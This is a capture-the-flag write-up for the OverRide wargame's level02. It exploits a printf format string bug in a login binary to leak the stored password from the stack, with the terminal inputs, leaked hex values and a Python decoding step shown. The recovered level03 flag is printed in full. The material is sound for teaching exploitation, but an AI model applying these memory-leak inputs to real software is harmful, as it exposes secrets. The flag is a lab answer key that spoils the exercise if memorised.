This time, the executable file is in ELF 64-bit format. Once launched, the program displays a prompt and asks the user to identify himself (username, then password). The program then displays (unless the credentials are good of course) a message in the format username + "does not have access!

By reconstructing the [source code](../source.c) with the help of gdb, we understand better how the program works and how we can exploit it. Three variables declared on the stack are relevant to us. The first one is intended to store the username of the user (at -0x70(%rbp)). The second one stores the content of the file `/home/users/level03/.pass` (at -0xa0(%rbp)). The third one stores the password given by the user (at -0x110(%rbp)).

If the password entered by the user is equal to the content of the .pass file, then a shell is launched. But then we wouldn't need to launch a shell anymore since we already know the password/flag.

The resolution of the exercise is elsewhere. Indeed, the content of the .pass file is stored on the stack. Moreover, a call to printf() is exploitable: On line 48 of the source.c file, the username variable is passed as the only argument to printf(). This allows us to perform a format string attack, inserting modifiers into the username variable which will be interpreted by printf(), and which will allow us to read the memory on the stack.

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
aaaaaaaa 0x7fffffffe4d0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x7025207025207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x6161616161616161 0x2520702520702520 0x2070252070252070  does not have access!
```

We can easily identify the location of the username variable, with an offset of 28 (starting with "aaaaaaaa" <=> 0x6161616161616161). Since the pass variable is 40 bytes long, and located 48 bytes below the username variable (0xa0 - 0x70 <=> 160 - 112), it is identified from offset 22 to offset 26.

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: ok
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

From there, we still have to convert the hexadecimal into text, which can be done by removing the 0x prefixes, and by reversing the reading direction (since the data is recorded in little endian). This can be done easily with a few lines of python: 
```
level02@OverRide:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> ba = bytearray.fromhex("48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848")
>>> ba.reverse()
>>> print(ba)
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
We can now reach the next level with the command `su level03` and fill in the flag found as a password.